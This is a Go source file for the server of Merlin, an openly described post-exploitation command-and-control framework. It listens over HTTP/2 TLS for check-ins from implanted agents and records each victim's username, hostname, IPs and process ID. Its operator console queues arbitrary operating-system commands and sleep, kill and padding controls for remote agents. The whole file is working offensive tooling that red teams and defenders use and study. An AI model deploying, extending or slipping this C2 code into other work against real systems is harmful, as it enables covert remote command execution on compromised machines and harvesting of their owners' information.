// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2017  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package main

import (
	// Standard
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	// 3rd Party
	"github.com/chzyer/readline"
	"github.com/fatih/color"
	"github.com/olekukonko/tablewriter"
	"github.com/satori/go.uuid"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg"
	"github.com/Ne0nd0g/merlin/pkg/banner"
	"github.com/Ne0nd0g/merlin/pkg/messages"
)

// Global Variables

var debug = false
var verbose = false
var src = rand.NewSource(time.Now().UnixNano())
var currentDir, _ = os.Getwd()
var agents = make(map[uuid.UUID]*agent) //global map to house agent objects
var paddingMax = 4096
var version = "nonRelease"
var build = "nonRelease"
var serverLog *os.File

// Constants

const (
	letterIdxBits = 6                    // 6 bits to represent a letter index
	letterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits
	letterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits
	letterBytes   = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
)

func main() {

	// Server Logging

	if _, err := os.Stat(filepath.Join(currentDir, "data", "log", "merlinServerLog.txt")); os.IsNotExist(err) {
		os.Mkdir(filepath.Join(currentDir, "data", "log"), os.ModeDir)
		os.Create(filepath.Join(currentDir, "data", "log", "merlinServerLog.txt"))
		if debug {
			color.Red("[DEBUG]Created server log file at: %s\\data\\log\\merlinServerLog.txt", currentDir)
		}
	}
	var errLog error
	serverLog, errLog = os.OpenFile(filepath.Join(currentDir, "data", "log", "merlinServerLog.txt"), os.O_APPEND|os.O_WRONLY, 0600)
	if errLog != nil {
		color.Red("[!]There was an error with the Merlin Server log file")
		fmt.Println(errLog)
	}
	serverLog.WriteString(fmt.Sprintf("[%s]Starting Merlin Server\r\n", time.Now()))

	flag.BoolVar(&verbose, "v", false, "Enable verbose output")
	flag.BoolVar(&debug, "debug", false, "Enable debug output")
	port := flag.Int("p", 443, "Merlin Server Port")
	ip := flag.String("i", "0.0.0.0", "The IP address of the interface to bind to")
	crt := flag.String("x509cert", filepath.Join(string(currentDir), "data", "x509", "server.crt"),
		"The x509 certificate for the HTTPS listener")
	key := flag.String("x509key", filepath.Join(string(currentDir), "data", "x509", "server.key"),
		"The x509 certificate key for the HTTPS listener")
	flag.Usage = func() {
		color.Blue("#################################################")
		color.Blue("#\t\tMERLIN SERVER\t\t\t#")
		color.Blue("#################################################")
		color.Blue("Version: " + version + " Build: " + build)
		flag.PrintDefaults()
	}
	flag.Parse()

	color.Blue(banner.Banner1)
	color.Blue("\t\t   Version: %s", version)
	color.Blue("\t\t   Build: %s", build)

	go startListener(strconv.Itoa(*port), *ip, *crt, *key, "/")
	shell()
}

func httpHandler(w http.ResponseWriter, r *http.Request) {
	if verbose {
		color.Yellow("[-]Received HTTP %s Connection from %s", r.Method, r.Host)
		serverLog.WriteString(fmt.Sprintf("[%s]Received HTTP %s Connection from %s\r\n", time.Now(),
			r.Method, r.Host))
	}

	if debug {
		color.Red("\n[DEBUG]HTTP Connection Details:")
		color.Red("[DEBUG]Host: %s", r.Host)
		color.Red("[DEBUG]URI: %s", r.RequestURI)
		color.Red("[DEBUG]Method: %s", r.Method)
		color.Red("[DEBUG]Protocol: %s", r.Proto)
		color.Red("[DEBUG]Headers: %s", r.Header)
		color.Red("[DEBUG]TLS Negotiated Protocol: %s", r.TLS.NegotiatedProtocol)
		color.Red("[DEBUG]TLS Cipher Suite: %d", r.TLS.CipherSuite)
		color.Red("[DEBUG]TLS Server Name: %s", r.TLS.ServerName)
		color.Red("[DEBUG]Content Length: %d", r.ContentLength)

		serverLog.WriteString(fmt.Sprintf("[%s][DEBUG]HTTP Connection Details:\r\n", time.Now()))
		serverLog.WriteString(fmt.Sprintf("[%s][DEBUG]Host: %s\r\n", time.Now(), r.Host))
		serverLog.WriteString(fmt.Sprintf("[%s][DEBUG]URI: %s\r\n", time.Now(), r.RequestURI))
		serverLog.WriteString(fmt.Sprintf("[%s][DEBUG]Method: %s\r\n", time.Now(), r.Method))
		serverLog.WriteString(fmt.Sprintf("[%s][DEBUG]Protocol: %s\r\n", time.Now(), r.Proto))
		serverLog.WriteString(fmt.Sprintf("[%s][DEBUG]Headers: %s\r\n", time.Now(), r.Header))
		serverLog.WriteString(fmt.Sprintf("[%s][DEBUG]TLS Negotiated Protocol: %s\r\n", time.Now(),
			r.TLS.NegotiatedProtocol))
		serverLog.WriteString(fmt.Sprintf("[%s][DEBUG]TLS Cipher Suite: %d\r\n", time.Now(), r.TLS.CipherSuite))
		serverLog.WriteString(fmt.Sprintf("[%s][DEBUG]TLS Server Name: %s\r\n", time.Now(), r.TLS.ServerName))
		serverLog.WriteString(fmt.Sprintf("[%s][DEBUG]Content Length: %d\r\n", time.Now(), r.ContentLength))
	}

	if r.Method == "POST" && r.ProtoMajor == 2 {

		var payload json.RawMessage
		j := messages.Base{
			Payload: &payload,
		}
		json.NewDecoder(r.Body).Decode(&j)

		if debug {
			color.Red("[DEBUG]POST DATA: %s", j)
		}
		switch j.Type {

		case "InitialCheckIn":
			var p messages.SysInfo
			json.Unmarshal(payload, &p)
			agentInitialCheckIn(j, p)

		case "StatusCheckIn":
			w.Header().Set("Content-Type", "application/json")
			x := statusCheckIn(j)
			if verbose {
				color.Yellow("[-]Sending " + x.Type + " message type to agent")
			}
			json.NewEncoder(w).Encode(x)

		case "CmdResults":
			// TODO move to its own function
			var p messages.CmdResults
			json.Unmarshal(payload, &p)
			agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Results for job: %s\r\n", time.Now(), p.Job))

			color.Cyan("[+]Results for job %s", p.Job)
			if len(p.Stdout) > 0 {
				agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command Results (stdout):\r\n%s\r\n",
					time.Now(),
					p.Stdout))
				color.Green("%s", p.Stdout)
			}
			if len(p.Stderr) > 0 {
				agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command Results (stderr):\r\n%s\r\n",
					time.Now(),
					p.Stderr))
				color.Red("%s", p.Stderr)
			}

		case "AgentInfo":
			var p messages.AgentInfo
			json.Unmarshal(payload, &p)
			agentInfo(j, p)

		default:
			color.Red("[!]Invalid Activity: %s", j.Type)
		}

	} else if r.Method == "GET" {
		// Should answer any GET requests
		// Send 404
		w.WriteHeader(404)
	} else {
		w.WriteHeader(404)
	}
}

func startListener(port string, ip string, crt string, key string, webpath string) {

	serverLog.WriteString(fmt.Sprintf("[%s]Starting HTTP/2 Listener \r\n", time.Now()))
	serverLog.WriteString(fmt.Sprintf("[%s]Address: %s:%s%s\r\n", time.Now(), ip, port, webpath))
	serverLog.WriteString(fmt.Sprintf("[%s]x.509 Certificate %s\r\n", time.Now(), crt))
	serverLog.WriteString(fmt.Sprintf("[%s]x.509 Key %s\r\n", time.Now(), key))

	time.Sleep(45 * time.Millisecond) // Sleep to allow the shell to start up
	// Check to make sure files exist
	_, errCrt := os.Stat(crt)
	if errCrt != nil {
		color.Red("[!]There was an error importing the SSL/TLS x509 certificate")
		serverLog.WriteString(fmt.Sprintf("[%s]There was an error importing the SSL/TLS x509 certificate\r\n",
			time.Now()))
		fmt.Println(errCrt)
		return
	}

	_, errKey := os.Stat(key)
	if errKey != nil {
		color.Red("[!]There was an error importing the SSL/TLS x509 key")
		serverLog.WriteString(fmt.Sprintf("[%s]There was an error importing the SSL/TLS x509 key\r\n",
			time.Now()))
		fmt.Println(errKey)
		return
	}

	cer, err := tls.LoadX509KeyPair(crt, key)

	if err != nil {
		color.Red("[!]There was an error importing the SSL/TLS x509 key pair")
		color.Red("[!]Ensure a keypair is located in the data/x509 directory")
		serverLog.WriteString(fmt.Sprintf("[%s]There was an error importing the SSL/TLS x509 key pair\r\n",
			time.Now()))
		fmt.Println(err)
		return
	}

	// Configure TLS
	config := &tls.Config{
		Certificates: []tls.Certificate{cer},
		MinVersion:   tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		},
		NextProtos: []string{"h2"},
	}
	http.HandleFunc(webpath, httpHandler)

	s := &http.Server{
		Addr:           ip + ":" + port,
		Handler:        nil,
		ReadTimeout:    10 * time.Second,
		WriteTimeout:   10 * time.Second,
		MaxHeaderBytes: 1 << 20,
		TLSConfig:      config,
	}

	// I shouldn't need to specify the certs as they are in the config
	color.Yellow("[-]HTTPS Listener Started on %s:%s", ip, port)
	err2 := s.ListenAndServeTLS(crt, key)
	if err2 != nil {
		color.Red("[!]There was an error starting the web server")
		serverLog.WriteString(fmt.Sprintf("[%s]There was an error starting the web server\r\n", time.Now()))
		fmt.Println(err2)
		return
	}
	// TODO determine scripts path and load certs by their absolute path
}

func agentInitialCheckIn(j messages.Base, p messages.SysInfo) {
	color.Green("[+]Received new agent checkin from %s", j.ID)
	serverLog.WriteString(fmt.Sprintf("[%s]Received new agent checkin from %s\r\n", time.Now(), j.ID))
	if verbose {
		color.Yellow("\t[i]Host ID: %s", j.ID)
		color.Yellow("\t[i]Activity: %s", j.Type)
		color.Yellow("\t[i]Payload: %s", j.Payload)
		color.Yellow("\t[i]Platform: %s", p.Platform)
		color.Yellow("\t[i]Architecture: %s", p.Architecture)
		color.Yellow("\t[i]Username: %s", p.UserName)
		color.Yellow("\t[i]IpAddrs: %v", p.Ips)
	}
	agentsDir := filepath.Join(currentDir, "data", "agents")

	if _, errD := os.Stat(agentsDir); os.IsNotExist(errD) {
		os.Mkdir(agentsDir, os.ModeDir)
	}
	if _, err := os.Stat(filepath.Join(agentsDir, j.ID.String())); os.IsNotExist(err) {
		os.Mkdir(filepath.Join(agentsDir, j.ID.String()), os.ModeDir)
		os.Create(filepath.Join(agentsDir, j.ID.String(), "agent_log.txt"))

		if verbose {
			color.Yellow("[-]Created agent log file at: %s", agentsDir, j.ID.String(), "agent_log.txt")
		}
	}

	f, err := os.OpenFile(filepath.Join(agentsDir, j.ID.String(), "agent_log.txt"), os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		panic(err)
	}
	// Add custom agent struct to global agents map
	agents[j.ID] = &agent{id: j.ID, userName: p.UserName, userGUID: p.UserGUID, platform: p.Platform,
		architecture: p.Architecture, ips: p.Ips,
		hostName: p.HostName, pid: p.Pid, channel: make(chan []string, 10),
		agentLog: f, iCheckIn: time.Now(), sCheckIn: time.Now()}

	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Initial check in for agent %s\r\n", time.Now(), j.ID))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Platform: %s\r\n", time.Now(), p.Platform))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Architecture: %s\r\n", time.Now(), p.Architecture))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]HostName: %s\r\n", time.Now(), p.HostName))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]UserName: %s\r\n", time.Now(), p.UserName))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]UserGUID: %s\r\n", time.Now(), p.UserGUID))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Process ID: %d\r\n", time.Now(), p.Pid))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]IPs: %v\r\n", time.Now(), p.Ips))

	// Add code here to create db record
}

func agentInfo(j messages.Base, p messages.AgentInfo) {
	_, ok := agents[j.ID]

	if !ok {
		color.Red("[!]The agent was not found while processing an AgentInfo message")
		return
	}
	if debug {
		color.Red("[DEBUG]Processing new agent info")
		color.Red("\t[DEBUG]Agent Version: %s", p.Version)
		color.Red("\t[DEBUG]Agent Build: %s", p.Build)
		color.Red("\t[DEBUG]Agent waitTime: %s", p.WaitTime)
		color.Red("\t[DEBUG]Agent paddingMax: %d", p.PaddingMax)
		color.Red("\t[DEBUG]Agent maxRetry: %d", p.MaxRetry)
		color.Red("\t[DEBUG]Agent failedCheckin: %d", p.FailedCheckin)
	}
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Processing AgentInfo message:\r\n", time.Now()))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent Version: %s \r\n", p.Version))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent Build: %s \r\n", p.Build))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent waitTime: %s \r\n", p.WaitTime))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent paddingMax: %d \r\n", p.PaddingMax))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent maxRetry: %d \r\n", p.MaxRetry))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("\tAgent failedCheckin: %d \r\n", p.FailedCheckin))

	agents[j.ID].version = p.Version
	agents[j.ID].build = p.Build
	agents[j.ID].waitTime = p.WaitTime
	agents[j.ID].paddingMax = p.PaddingMax
	agents[j.ID].maxRetry = p.MaxRetry
	agents[j.ID].failedCheckin = p.FailedCheckin
}

func statusCheckIn(j messages.Base) messages.Base {
	// Check to make sure agent UUID is in dataset
	_, ok := agents[j.ID]
	if !ok {
		color.Red("[!]Orphaned agent %s has checked in. Instructing agent to re-initialize...", j.ID.String())
		serverLog.WriteString(fmt.Sprintf("[%s]Orphaned agent %s has checked in\r\n", time.Now(), j.ID.String()))
		jobID := randStringBytesMaskImprSrc(10)
		color.Yellow("[-]Created job %s for agent %s", jobID, j.ID)
		g := messages.Base{
			Version: 1.0,
			ID:      j.ID,
			Type:    "AgentControl",
			Padding: randStringBytesMaskImprSrc(paddingMax),
		}
		p := messages.AgentControl{
			Command: "initialize",
			Job:     jobID,
		}

		k := marshalMessage(p)
		g.Payload = (*json.RawMessage)(&k)
		return g
	}

	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Agent status check in\r\n", time.Now()))
	if verbose {
		color.Green("[+]Received agent status checkin from %s", j.ID)
	}
	if debug {
		color.Red("[DEBUG]Received agent status checkin from %s", j.ID)
		color.Red("[DEBUG]Channel length: %d", len(agents[j.ID].channel))
		color.Red("[DEBUG]Channel content: %s", agents[j.ID].channel)
	}

	agents[j.ID].sCheckIn = time.Now()
	if len(agents[j.ID].channel) >= 1 {
		command := <-agents[j.ID].channel
		jobID := randStringBytesMaskImprSrc(10)
		color.Yellow("[-]Created job %s for agent %s", jobID, j.ID)

		agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command Type: %s\r\n", time.Now(), command[1]))
		agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command: %s\r\n", time.Now(), command[3:]))
		agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Created job %s for agent %s\r\n", time.Now(), jobID, j.ID))

		m := messages.Base{
			Version: 1.0,
			ID:      j.ID,
			Padding: randStringBytesMaskImprSrc(paddingMax),
		}

		switch command[1] {
		case "cmd":
			p := messages.CmdPayload{
				Command: command[3],
				Job:     jobID,
			}
			if len(command) > 4 {
				p.Args = strings.Join(command[4:], " ")
			}

			k := marshalMessage(p)
			m.Type = "CmdPayload"
			m.Payload = (*json.RawMessage)(&k)

			return m

		case "control":
			p := messages.AgentControl{
				Command: command[3],
				Job:     jobID,
			}

			if len(command) == 5 {
				p.Args = command[4]
			}

			k := marshalMessage(p)
			m.Type = "AgentControl"
			m.Payload = (*json.RawMessage)(&k)

			if command[3] == "kill" {
				delete(agents, j.ID)
			}
			return m

		case "kill":
			p := messages.AgentControl{
				Command: command[1],
				Job:     jobID,
			}

			k := marshalMessage(p)
			m.Type = "AgentControl"
			m.Payload = (*json.RawMessage)(&k)

			delete(agents, j.ID)

			return m

		default:
			m.Type = "ServerOk"
			return m
		}
	} else {
		g := messages.Base{
			Version: 1.0,
			ID:      j.ID,
			Type:    "ServerOk",
			Padding: randStringBytesMaskImprSrc(paddingMax),
		}
		return g
	}

}

func usage() {
	color.Yellow("Merlin C2 Server (version %s)", merlin.Version)
	table := tablewriter.NewWriter(os.Stdout)
	table.SetAlignment(tablewriter.ALIGN_LEFT)
	table.SetHeader([]string{"Command", "Arguments", "Options", "Description"})

	data := [][]string{
		{"agent cmd", "<agent ID> <command>", "", "Run a command on target's operating system"},
		{"agent control", "<agent ID> <command>", "sleep, kill, padding", "Control messages & " +
			"functions to the agent itself"},
		{"agent info", "<agent ID>", "", "Display all information about an agent"},
		{"agent list", "None", "", "List all checked In agents"},
		{"exit", "None", "", "Exit the Merlin server"},
		{"quit", "None", "", "Exit the Merlin server"},
	}

	table.AppendBulk(data)
	fmt.Println()
	table.Render()
	fmt.Println()
}

func filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}

func getAgentList() func(string) []string {
	return func(line string) []string {
		a := make([]string, 0)
		for k := range agents {
			a = append(a, k.String())
		}
		return a
	}
}

func shell() {

	var agentCompleter = readline.PcItemDynamic(getAgentList())
	var completer = readline.NewPrefixCompleter(
		readline.PcItem("agent",
			readline.PcItem("list"),
			readline.PcItem("info",
				agentCompleter,
			),
			readline.PcItem("cmd",
				agentCompleter,
			),
			readline.PcItem("control",
				readline.PcItemDynamic(getAgentList(),
					readline.PcItem("sleep"),
					readline.PcItem("kill"),
					readline.PcItem("padding"),
					readline.PcItem("maxretry"),
				),
			),
			readline.PcItem("kill",
				agentCompleter,
			),
		),
		readline.PcItem("exit"),
		readline.PcItem("quit"),
		readline.PcItem("help"),
	)

	ms, err := readline.NewEx(&readline.Config{
		Prompt:              "\033[31mMerlin»\033[0m ",
		HistoryFile:         "/tmp/readline.tmp",
		AutoComplete:        completer,
		InterruptPrompt:     "^C",
		EOFPrompt:           "exit",
		HistorySearchFold:   true,
		FuncFilterInputRune: filterInput,
	})

	if err != nil {
		color.Red("[!]There was an error with the provided input")
		color.Red(err.Error())
	}
	defer ms.Close()

	log.SetOutput(ms.Stderr())

	for {
		line, err := ms.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		cmd := strings.Split(line, " ")

		switch cmd[0] {
		case "agent":
			if len(cmd) > 1 {
				switch cmd[1] {
				case "list":
					table := tablewriter.NewWriter(os.Stdout)
					table.SetHeader([]string{"Agent GUID", "Platform", "User", "Host", "Transport"})
					table.SetAlignment(tablewriter.ALIGN_CENTER)
					for k, v := range agents {
						table.Append([]string{k.String(), v.platform + "/" + v.architecture, v.userName,
							v.hostName, "HTTP/2"})
					}
					fmt.Println()
					table.Render()
					fmt.Println()
				case "info":
					if len(cmd) == 2 {
						color.Red("[!]Invalid command")
						color.White("agent info <agent_id>")
					} else if len(cmd) >= 3 {
						a, _ := uuid.FromString(cmd[2])
						table := tablewriter.NewWriter(os.Stdout)
						table.SetAlignment(tablewriter.ALIGN_LEFT)
						data := [][]string{
							{"ID", agents[a].id.String()},
							{"Platform", agents[a].platform},
							{"Architecture", agents[a].architecture},
							{"UserName", agents[a].userName},
							{"User GUID", agents[a].userGUID},
							{"Hostname", agents[a].hostName},
							{"IPs", fmt.Sprintf("%v", agents[a].ips)},
							{"Process ID", strconv.Itoa(agents[a].pid)},
							{"Initial Check In", agents[a].iCheckIn.String()},
							{"Last Check In", agents[a].sCheckIn.String()},
							{"Agent Version", agents[a].version},
							{"Agent Build", agents[a].build},
							{"Agent Wait Time", agents[a].waitTime},
							{"Agent Message Padding Max", strconv.Itoa(agents[a].paddingMax)},
							{"Agent Max Retries", strconv.Itoa(agents[a].maxRetry)},
							{"Agent Failed Logins", strconv.Itoa(agents[a].failedCheckin)},
						}
						table.AppendBulk(data)
						fmt.Println()
						table.Render()
						fmt.Println()
					}
				case "cmd":
					if len(cmd) >= 4 {
						addChannel(cmd)
						cmdAgent := base64.StdEncoding.EncodeToString([]byte(cmd[3]))
						if debug {
							color.Red("[DEBUG]Input: %s", cmd[3])
							color.Red("[DEBUG]Base64 Input: %s", cmdAgent)
						}
					} else {
						color.Red("[!]Invalid command")
						color.White("agent cmd <agent ID> <cmd>")
					}
				case "kill":
					if len(cmd) == 3 {
						addChannel(cmd)
					} else {
						color.Red("[!]Invalid command")
						color.White("agent kill <agent ID>")
					}
				case "control":
					switch cmd[3] {
					case "kill":
						addChannel(cmd)
					case "sleep":
						if len(cmd) == 5 {
							_, err := time.ParseDuration(cmd[4])
							if err != nil {
								color.Red("[!]There was an error setting the agent sleep time")
								color.Red(err.Error())
							} else {
								addChannel(cmd)
							}
						} else {
							color.Red("[!]Invalid command")
							color.White("agent control <agent ID> sleep <time>")
						}
					case "padding":
						if len(cmd) == 5 {
							_, err := strconv.Atoi(cmd[4])
							if err != nil {
								color.Red("[!]There was an error setting the agent maximum message padding size")
								color.Red(err.Error())
							} else {
								addChannel(cmd)
							}
						} else {
							color.Red("[!]Invalid command")
							color.White("agent control <agent ID> padding <size as integer>")
						}
					case "maxretry":
						if len(cmd) == 5 {
							_, err := strconv.Atoi(cmd[4])
							if err != nil {
								color.Red("[!]There was an error setting the agent maximum retries")
								color.Red(err.Error())
							} else {
								addChannel(cmd)
							}
						} else {
							color.Red("[!]Invalid command")
							color.White("agent control <agent ID> maxretry <tries as integer>")
						}
					}
				default:
					color.Yellow("[-]Invalid agent command:", line[5:])
				}
			} else {
				color.Yellow("[-]Missing subsequent agent command")
			}
		case "help":
			usage()
		case "?":
			usage()
		case "exit":
			color.Red("[!]Quitting")
			serverLog.WriteString(fmt.Sprintf("[%s]Shutting down Merlin Server due to user input", time.Now()))
			os.Exit(0)
		case "quit":
			color.Red("[!]Quitting")
			serverLog.WriteString(fmt.Sprintf("[%s]Shutting down Merlin Server due to user input", time.Now()))
			os.Exit(0)
		case "":
		default:
			color.Yellow("[-]Invalid command")
		}
	}
}

func randStringBytesMaskImprSrc(n int) string {
	// http://stackoverflow.com/questions/22892120/how-to-generate-a-random-string-of-a-fixed-length-in-golang
	b := make([]byte, n)
	// A src.Int63() generates 63 random bits, enough for letterIdxMax characters!
	for i, cache, remain := n-1, src.Int63(), letterIdxMax; i >= 0; {
		if remain == 0 {
			cache, remain = src.Int63(), letterIdxMax
		}
		if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
			b[i] = letterBytes[idx]
			i--
		}
		cache >>= letterIdxBits
		remain--
	}

	return string(b)
}

func marshalMessage(m interface{}) []byte {
	k, err := json.Marshal(m)
	if err != nil {
		color.Red("There was an error marshaling the JSON object")
		color.Red(err.Error())
	}
	return k
}

func addChannel(cmd []string) {
	a, err := uuid.FromString(cmd[2])
	if err != nil {
		color.Red("[!]Error converting passed in string to a UUID")
		color.Red(err.Error())
	}
	s := agents[a].channel
	s <- cmd
}

type agent struct {
	id            uuid.UUID
	platform      string
	architecture  string
	userName      string
	userGUID      string
	hostName      string
	ips           []string
	pid           int
	agentLog      *os.File
	channel       chan []string
	iCheckIn      time.Time
	sCheckIn      time.Time
	version       string
	build         string
	waitTime      string
	paddingMax    int
	maxRetry      int
	failedCheckin int
}

// TODO Add session ID
// TODO add job and its ID to the channel immediately after input
// TODO add warning for using distributed TLS cert
// TODO change default useragent from Go-http-client/2.0
// TODO add CSRF tokens
